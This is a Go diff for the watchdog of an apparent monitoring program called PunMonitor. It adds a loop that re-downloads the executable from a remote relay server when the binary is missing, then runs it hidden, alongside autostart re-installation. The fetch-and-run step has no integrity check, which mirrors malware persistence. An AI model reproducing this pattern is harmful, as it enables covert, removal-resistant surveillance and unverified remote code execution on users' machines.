@@ -3214,36 +3214,57 @@ func runWatchdog() {
 	// Re-install autostart to ensure resilience
 	setupAutostart()
 
-	// Use the permanent binary path so the main process always starts from
-	// the protected location (binDir), even if the watchdog itself is still
-	// running from a temporary location.
 	watchdogExe, err := os.Executable()
 	if err != nil {
 		wlog("Failed to get executable path: %v", err)
 		os.Exit(1)
 	}
 	permPath := filepath.Join(binDir(), filepath.Base(watchdogExe))
-	// If the permanent copy exists, use it; otherwise fall back to current path
 	exePath := permPath
 	if _, err := os.Stat(permPath); err != nil {
 		exePath = watchdogExe
 	}
 
 	go func() {
-		// Write heartbeat every 10s so monitor can verify watchdog is alive
 		for {
 			time.Sleep(10 * time.Second)
 			writeWatchdogHeartbeat()
 		}
 	}()
 
+	// Auto-recovery: if binary is missing, download from server
 	for {
+		if _, err := os.Stat(exePath); err != nil {
+			wlog("Binary not found at %s — attempting recovery", exePath)
+			downloadURL := "https://relay.recruitedge.us/download/PunMonitor.exe"
+			if cfg.ServerURL != "" {
+				downloadURL = cfg.ServerURL + "/download/PunMonitor.exe"
+			}
+			wlog("Downloading from %s", downloadURL)
+			resp, err := http.Get(downloadURL)
+			if err == nil && resp.StatusCode == 200 {
+				os.MkdirAll(filepath.Dir(exePath), 0755)
+				out, err := os.Create(exePath)
+				if err == nil {
+					io.Copy(out, resp.Body)
+					out.Close()
+					os.Chmod(exePath, 0755)
+					wlog("Recovery: binary downloaded to %s", exePath)
+				}
+				resp.Body.Close()
+			} else {
+				wlog("Recovery: download failed, retrying in 6 hours")
+				time.Sleep(6 * time.Hour)
+				continue
+			}
+		}
+
+		wlog("Starting monitor from %s", exePath)
 		cmd := exec.Command(exePath)
 		cmd.Stdout = nil
 		cmd.Stderr = nil
 		newHiddenCmd(cmd)
 
-		wlog("Starting monitor...")
 		if err := cmd.Start(); err != nil {
 			wlog("Failed to start monitor: %v", err)
 			time.Sleep(5 * time.Second)
